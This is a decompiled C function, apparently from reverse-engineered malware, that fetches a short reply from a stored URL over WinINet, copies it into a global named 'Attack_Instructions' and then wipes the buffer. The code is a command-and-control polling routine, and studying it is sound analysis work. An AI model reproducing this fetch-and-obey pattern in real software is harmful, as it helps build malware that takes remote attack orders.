undefined8 Verify_Connection(void) {
  int iVar1;
  undefined8 uVar2;
  size_t sVar3;
  undefined4 local_24;
  char *local_20;
  longlong local_18;
  longlong local_10;
  
  local_10 = 0;
  local_18 = 0;
  local_10 = InternetOpenA(0,1,0,0,0);
  if (local_10 == 0)
    uVar2 = 0;
  else {
    local_18 = InternetOpenUrlA(local_10,&URL,0,0,0x2000,0);
    if (local_18 == 0)
      uVar2 = 0;
    else {
      local_20 = (char *)0x0;
      local_24 = 0;
      local_20 = (char *)LocalAlloc(0x40,0x80);
      iVar1 = InternetReadFile(local_18,local_20,0x80,&local_24);
      if (iVar1 == 0)
        uVar2 = 0;
      else {
        InternetSetOptionW(0,0x27,0,0);
        sVar3 = strlen(local_20);
        memcpy(&Attack_Instructions,local_20,sVar3 + 1);
        sVar3 = strlen(local_20);
        memset(local_20,0,sVar3);
        InternetCloseHandle(local_18);
        uVar2 = InternetCloseHandle(local_10);
      }
    }
  }
  return uVar2;
}
